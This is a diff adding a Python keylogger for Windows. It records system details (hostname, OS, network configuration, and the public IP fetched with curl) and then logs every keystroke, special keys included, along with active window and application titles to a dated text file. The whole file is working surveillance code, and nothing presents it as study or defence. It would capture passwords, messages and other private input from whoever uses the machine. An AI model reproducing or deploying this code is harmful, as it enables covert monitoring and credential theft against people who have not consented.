@@ -1,0 +1,198 @@
+import time
+import ctypes
+import psutil
+import platform
+import subprocess
+import socket
+import pygetwindow as gw
+from pynput.keyboard import Listener
+import keyboard
+
+def get_current_time():
+    return time.strftime("%A, %B %d, %Y %H:%M:%S")
+
+def get_public_ip():
+    try:
+        response = subprocess.check_output("curl ifconfig.me", shell=True)
+        return response.decode("utf-8").strip()
+    except Exception as e:
+        return "Unable to retrieve public IP"
+
+date = time.strftime("%A, %B %d, %Y") + ".txt"
+current_app = None
+current_window = None
+current_app_line = ""
+current_window_line = ""
+
+computer_name = f"\nComputer Name: {socket.gethostname()}\n"
+os_info = f"OS: {platform.system()} {platform.release()}\n"
+ipconfig_info = f"\n{subprocess.getoutput('ipconfig')}\n"
+public_ip = f"\tPublic IP: {get_public_ip()}\n"
+
+system_info = f"Computer Information\n{computer_name}{os_info}{ipconfig_info}\n{public_ip}\n"
+
+
+with open(date, "a", encoding="utf-8") as f:
+    f.write(system_info)
+    f.write("[" + get_current_time() + "] : ")
+
+def is_capslock_on():
+    return ctypes.windll.user32.GetKeyState(0x14) & 1
+
+caps_lock_on = is_capslock_on()
+
+def get_active_window_title():
+    active_window = gw.getWindowsWithTitle(gw.getActiveWindow().title)
+    return active_window[0].title if active_window else "Unknown Application"
+
+def check_caps_lock():
+    global caps_lock_on
+    if keyboard.is_pressed('caps lock'):
+        caps_lock_on = not caps_lock_on
+
+def OnKeyboardEvent(event):
+    global date, caps_lock_on, current_app, current_window, current_app_line, current_window_line
+    check_caps_lock()
+    event = str(event)
+    event = event.replace("'", "")
+
+    if event == "Key.enter":
+        event = "\n"
+        event = " {ENTER} "
+        with open(date ,"a") as f:
+            f.write(f"{event}\n")
+            f.write("[" + get_current_time() + "] : ")
+
+    elif event == "Key.space":
+        event = " "
+    
+    elif event == "Key.backspace":
+        event = " {BACKSPACE} "
+
+    elif event == "Key.shift":
+        event = " {L.SHIFT} "
+
+    elif event == "Key.shift_r":
+        event = " {R.SHIFT} "
+
+    elif event == "Key.caps_lock":
+        event = " {CAPSLOCK} "
+
+    elif event == "Key.ctrl_l":
+        event = " {L.CTRL} "
+
+    elif event == "Key.ctrl_r":
+        event = " {R.CTRL} "
+
+    elif event == "Key.tab":
+        event = " {TAB} "
+
+    elif event == "Key.alt_l":
+        event = " {L.ALT} "
+
+    elif event == "Key.alt_gr":
+        event = " {R.ALT} "
+
+    elif event == "Key.up":
+        event = " {UP.KEY} "
+
+    elif event == "Key.left":
+        event = " {LEFT.KEY} "
+
+    elif event == "Key.down":
+        event = " {DOWN.KEY} "
+
+    elif event == "Key.right":
+        event = " {RIGHT.KEY} "
+
+    elif event == "Key.cmd":
+        event = " {L.WINKEY} "
+
+    elif event == "Key.cmd_r":
+        event = " {R.WINKEY} "
+
+    elif event == "Key.esc":
+        event = " {ESC} "
+
+    elif event == "Key.f1":
+        event = " {F1} "
+
+    elif event == "Key.f2":
+        event = " {F2} "
+
+    elif event == "Key.f3":
+        event = " {F3} "
+
+    elif event == "Key.f4":
+        event = " {F4} "
+
+    elif event == "Key.f5":
+        event = " {F5} "
+
+    elif event == "Key.f6":
+        event = " {F6} "
+
+    elif event == "Key.f7":
+        event = " {F7} "
+
+    elif event == "Key.f8":
+        event = " {F8} "
+
+    elif event == "Key.f9":
+        event = " {F9} "
+
+    elif event == "Key.f10":
+        event = " {F10} "
+
+    elif event == "Key.f11":
+        event = " {F11} "
+
+    elif event == "Key.f12":
+        event = " {F12} "
+
+    elif event == "Key.insert":
+        event = " {INSERT} "
+
+    elif event == "Key.delete":
+        event = " {DELETE} "
+
+    elif event == "Key.home":
+        event = " {HOME} "
+
+    elif event == "Key.page_up":
+        event = " {PAGE.UP} "
+
+    elif event == "Key.scroll_lock":
+        event = " {SCROLL.LOCK} "
+
+    elif event == "Key.pause":
+        event = " {PAUSE.BREAK} "
+
+    elif event == "Key.menu":
+        event = " {MENU} "
+
+    elif event == "Key.num_lock":
+        event = " {NUM.LOCK} "
+
+    if event.isalpha():
+        if caps_lock_on:
+            event = event.upper()
+        else:
+            event = event.lower()
+
+    active_app = get_active_window_title()
+    if current_app != active_app:
+        current_app = active_app
+        with open(date, "a", encoding="utf-8") as f:
+            f.write(f"\n[{get_current_time()}] : [Application: {current_app}]")
+
+    active_window = gw.getActiveWindow().title
+    if current_window != active_window:
+        current_window = active_window
+        current_window_line = f"[Window/Tab: {current_window}]"
+
+    with open(date, "a", encoding="utf-8") as f:
+        f.write(event)
+        
+with Listener(on_press=OnKeyboardEvent) as listener:
+    listener.join()
